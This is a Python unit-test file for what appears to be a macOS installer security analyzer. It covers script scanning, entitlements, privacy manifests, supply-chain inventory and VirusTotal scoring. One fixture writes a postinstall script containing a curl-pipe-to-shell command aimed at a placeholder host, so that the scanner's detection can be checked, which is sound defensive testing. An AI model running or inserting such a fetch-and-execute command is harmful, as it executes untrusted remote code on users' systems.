from pathlib import Path
from tempfile import TemporaryDirectory
from datetime import UTC, datetime, timedelta
import unittest
from unittest import mock

import plistlib

from app import environment_status, save_local_api_key
from canuinstall.analyzer import (
    assess_virustotal_history,
    analyze_path,
    hash_path,
    inspect_data_security,
    inspect_dynamic_readiness,
    inspect_entitlements,
    inspect_virustotal,
    inspect_source_reputation,
    inspect_scripts,
    inspect_supply_chain,
)
from canuinstall.commands import CommandResult, run
from canuinstall.models import AnalysisContext
from canuinstall.progress import Job, reset_reporter, set_reporter
from canuinstall.tart_dynamic import _parse_sections


class AnalyzerTests(unittest.TestCase):
    def test_hash_file(self):
        with TemporaryDirectory() as temp:
            path = Path(temp) / "sample"
            path.write_bytes(b"hello")
            self.assertEqual(
                hash_path(path),
                "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824",
            )

    def test_dangerous_script_is_blocking(self):
        with TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "postinstall").write_text("curl https://bad.example/x | sh\n")
            context = AnalysisContext()
            inspect_scripts([root], context)
            self.assertTrue(any(f.severity == "critical" for f in context.findings))
            report = context.to_report({"type": "file", "name": "installer.pkg"})
            scripts = next(
                item
                for group in report["assessment"]
                for item in group["items"]
                if item["id"] == "scripts"
            )
            self.assertEqual(scripts["status"], "risk")
            self.assertEqual(len(scripts["relatedFindings"]), 2)
            self.assertTrue(scripts["relatedFindings"][0]["evidence"])

    def test_entitlements_parser_accepts_codesign_noise(self):
        context = AnalysisContext()
        xml = """Executable=/tmp/Test.app
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>com.apple.security.app-sandbox</key><true/>
</dict></plist>
warning: trailing diagnostic
"""
        result = CommandResult(["codesign"], 0, "", xml)
        inspect_entitlements(result, Path("/tmp/Test.app"), context)
        self.assertIn("Test.app", context.metadata["entitlements"])
        self.assertFalse(any(f.points and f.points < 0 for f in context.findings))

    def test_unsigned_app_produces_explainable_report(self):
        with TemporaryDirectory() as temp:
            root = Path(temp)
            app = root / "Example.app"
            contents = app / "Contents"
            contents.mkdir(parents=True)
            with (contents / "Info.plist").open("wb") as handle:
                plistlib.dump(
                    {
                        "CFBundleIdentifier": "example.unsigned",
                        "CFBundleVersion": "1",
                        "NSMicrophoneUsageDescription": "Record meetings",
                    },
                    handle,
                )
            report = analyze_path(
                app,
                source={"type": "file", "name": app.name},
                workdir=root,
                vt_api_key=None,
            )
            self.assertGreater(report["summary"]["score"], 0)
            self.assertTrue(
                any("签名" in finding["category"] for finding in report["findings"])
            )
            self.assertTrue(
                any("麦克风" in finding["title"] for finding in report["findings"])
            )

    def test_low_confidence_never_recommends_automatic_approval(self):
        context = AnalysisContext()
        context.checks_run.add("file")
        report = context.to_report({"type": "file", "name": "unknown.bin"})
        self.assertIn("不能自动批准", report["summary"]["recommendation"])

    def test_assessment_matrix_exposes_not_run_controls(self):
        context = AnalysisContext()
        context.control("signature", "pass", "signed")
        report = context.to_report({"type": "file", "name": "app.dmg"})
        controls = {
            item["id"]: item
            for group in report["assessment"]
            for item in group["items"]
        }
        self.assertEqual(controls["signature"]["status"], "pass")
        self.assertEqual(controls["dynamic_analysis"]["status"], "not_run")
        self.assertEqual(report["coverage"]["total"], 26)
        groups = {
            group["id"]: [item["id"] for item in group["items"]]
            for group in report["assessment"]
        }
        self.assertIn("privacy", groups["data_security"])
        self.assertIn("file_access", groups["data_security"])
        self.assertNotIn("privacy", groups["system"])
        self.assertIn("static_indicators", groups["system"])

    def test_file_access_entitlements_are_reported_with_evidence(self):
        context = AnalysisContext()
        xml = """<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>com.apple.security.app-sandbox</key><true/>
<key>com.apple.security.files.user-selected.read-write</key><true/>
<key>com.apple.security.files.downloads.read-only</key><true/>
</dict></plist>"""
        result = CommandResult(["codesign"], 0, xml, "")
        inspect_entitlements(result, Path("/tmp/Files.app"), context)
        report = context.to_report({"type": "file", "name": "Files.app"})
        file_access = next(
            item
            for group in report["assessment"]
            for item in group["items"]
            if item["id"] == "file_access"
        )
        self.assertEqual(file_access["status"], "observe")
        self.assertIn("Downloads", file_access["evidence"])
        self.assertEqual(len(file_access["relatedFindings"]), 1)
        self.assertFalse(file_access["requiresHumanReview"])
        self.assertIn("访问范围", file_access["action"])

    def test_supply_chain_inventory_finds_runtime_and_framework(self):
        with TemporaryDirectory() as temp:
            root = Path(temp)
            frameworks = root / "Example.app" / "Contents" / "Frameworks"
            (frameworks / "Electron Framework.framework").mkdir(parents=True)
            (frameworks / "Sparkle.framework").mkdir()
            (frameworks / "libthirdparty.dylib").write_bytes(b"not-a-mach-o")
            context = AnalysisContext()
            inspect_supply_chain([root], context)
            supply = context.metadata["supplyChain"]
            self.assertIn("Electron", supply["runtimes"])
            self.assertIn("Sparkle", supply["updateFrameworks"])
            self.assertEqual(context.controls["components"]["status"], "pass")
            report = context.to_report({"type": "file", "name": "Example.app"})
            components = next(
                item
                for group in report["assessment"]
                for item in group["items"]
                if item["id"] == "components"
            )
            self.assertFalse(components["requiresHumanReview"])
            self.assertIn("不需要逐个动态库", components["action"])

    def test_privacy_manifest_reports_declared_collection_and_tracking(self):
        with TemporaryDirectory() as temp:
            root = Path(temp)
            manifest = root / "PrivacyInfo.xcprivacy"
            with manifest.open("wb") as handle:
                plistlib.dump(
                    {
                        "NSPrivacyTracking": True,
                        "NSPrivacyCollectedDataTypes": [
                            {
                                "NSPrivacyCollectedDataType": "NSPrivacyCollectedDataTypeEmailAddress",
                                "NSPrivacyCollectedDataTypeLinked": True,
                                "NSPrivacyCollectedDataTypeTracking": True,
                                "NSPrivacyCollectedDataTypePurposes": [
                                    "NSPrivacyCollectedDataTypePurposeAnalytics"
                                ],
                            }
                        ],
                    },
                    handle,
                )
            context = AnalysisContext()
            inspect_data_security([root], context)
            self.assertEqual(context.controls["privacy_manifest"]["status"], "review")
            self.assertTrue(context.metadata["dataSecurity"]["trackingDeclared"])
            self.assertTrue(
                any(
                    finding.control_id == "privacy_manifest"
                    for finding in context.findings
                )
            )

    def test_data_security_static_hints_are_explainable(self):
        with TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "Sentry.framework").mkdir()
            binary = root / "ExampleBinary"
            binary.write_bytes(
                b"NSPasteboard sqlite3_open URLSession CryptoKit Sentry"
            )
            context = AnalysisContext()
            inspect_data_security([root], context)
            self.assertEqual(context.controls["sensitive_data"]["status"], "observe")
            self.assertEqual(context.controls["data_transmission"]["status"], "observe")
            self.assertEqual(
                context.controls["local_data_protection"]["status"], "observe"
            )
            self.assertEqual(context.controls["telemetry_tracking"]["status"], "review")
            self.assertIn(
                "不代表运行时一定执行",
                context.controls["sensitive_data"]["evidence"],
            )

    def test_dynamic_readiness_provides_safe_local_plan(self):
        context = AnalysisContext()
        inspect_dynamic_readiness(context)
        report = context.to_report({"type": "file", "name": "Example.app"})
        dynamic = next(
            item
            for group in report["assessment"]
            for item in group["items"]
            if item["id"] == "dynamic_analysis"
        )
        self.assertEqual(dynamic["status"], "not_run")
        self.assertIn("专用测试账户", dynamic["action"])
        self.assertIn("macOS 虚拟机", dynamic["action"])
        self.assertIn("dynamicReadiness", report["metadata"])

    def test_uploaded_file_without_homepage_has_unknown_source_reputation(self):
        context = AnalysisContext()
        inspect_source_reputation({"type": "file", "name": "app.dmg"}, context)
        self.assertEqual(context.controls["source_reputation"]["status"], "unknown")

    def test_job_snapshot_returns_incremental_events(self):
        job = Job(id="test")
        job.log("one")
        job.log("two")
        snapshot = job.snapshot(1)
        self.assertEqual([event["message"] for event in snapshot["events"]], ["two"])
        self.assertEqual(snapshot["next"], 2)

    def test_command_runner_emits_command_and_output(self):
        events = []
        token = set_reporter(
            lambda message, level, kind: events.append((message, level, kind))
        )
        try:
            result = run(["/bin/echo", "hello"])
        finally:
            reset_reporter(token)
        self.assertEqual(result.returncode, 0)
        self.assertTrue(any(kind == "command" for _, _, kind in events))
        self.assertTrue(any("hello" in message for message, _, _ in events))

    def test_local_api_key_is_private_and_can_be_cleared(self):
        with TemporaryDirectory() as temp:
            path = Path(temp) / ".env.local"
            key = "a" * 64
            save_local_api_key(path, key)
            self.assertEqual(path.read_text(), f"VIRUSTOTAL_API_KEY={key}\n")
            self.assertEqual(path.stat().st_mode & 0o777, 0o600)
            save_local_api_key(path, None)
            self.assertFalse(path.exists())

    def test_environment_status_explains_missing_capabilities(self):
        status = environment_status()
        self.assertIn("groups", status)
        self.assertIn("missingEffects", status)
        tool_ids = {
            item["id"]
            for group in status["groups"]
            for item in group["items"]
        }
        self.assertIn("codesign", tool_ids)
        self.assertIn("clamscan", tool_ids)
        self.assertIn("sandbox-exec", tool_ids)
        self.assertIn("tart", tool_ids)
        self.assertIn("tart-base-vm", tool_ids)

    def test_tart_output_sections_are_parsed(self):
        sections = _parse_sections(
            """===CANUINSTALL:LAUNCH_STATUS===
launched
===CANUINSTALL:NETWORK===
Example 1 admin 10u IPv4 TCP 10.0.0.2:5000->1.1.1.1:443
"""
        )
        self.assertEqual(sections["LAUNCH_STATUS"], "launched")
        self.assertIn("1.1.1.1:443", sections["NETWORK"])

    def test_virustotal_missing_hash_adds_small_uncertainty(self):
        context = AnalysisContext()
        with mock.patch(
            "canuinstall.analyzer.virustotal.lookup",
            return_value={"status": 404, "payload": {}},
        ):
            inspect_virustotal("a" * 64, "key", context)
        self.assertEqual(context.controls["virustotal"]["status"], "observe")
        finding = next(
            item for item in context.findings if item.control_id == "virustotal"
        )
        self.assertEqual(finding.score(), 2)
        self.assertEqual(context.metadata["virusTotal"]["historyMaturity"], "unseen")

    def test_virustotal_new_clean_hash_adds_small_uncertainty(self):
        now = datetime(2026, 6, 13, tzinfo=UTC)
        first = int((now - timedelta(days=10)).timestamp())
        payload = {
            "data": {
                "attributes": {
                    "first_submission_date": first,
                    "last_submission_date": first,
                    "last_analysis_date": first,
                    "times_submitted": 1,
                    "last_analysis_stats": {
                        "malicious": 0,
                        "suspicious": 0,
                        "harmless": 0,
                        "undetected": 70,
                    },
                }
            }
        }
        context = AnalysisContext()
        with mock.patch(
            "canuinstall.analyzer.virustotal.lookup",
            return_value={"status": 200, "payload": payload},
        ):
            inspect_virustotal("a" * 64, "key", context, now=now)
        finding = next(
            item
            for item in context.findings
            if item.title == "VirusTotal 样本历史很短"
        )
        self.assertEqual(finding.score(), 3)
        self.assertEqual(context.controls["virustotal"]["status"], "observe")

    def test_virustotal_old_clean_hash_is_positive_evidence(self):
        now = datetime(2026, 6, 13, tzinfo=UTC)
        history = assess_virustotal_history(
            {
                "first_submission_date": int(
                    (now - timedelta(days=5 * 365)).timestamp()
                ),
                "last_submission_date": int((now - timedelta(days=20)).timestamp()),
                "last_analysis_date": int((now - timedelta(days=2)).timestamp()),
                "times_submitted": 12,
                "unique_sources": 7,
                "reputation": 4,
                "total_votes": {"harmless": 3, "malicious": 0},
            },
            now=now,
        )
        self.assertEqual(history["historyMaturity"], "mature")
        self.assertGreaterEqual(history["ageDays"], 5 * 365)


if __name__ == "__main__":
    unittest.main()
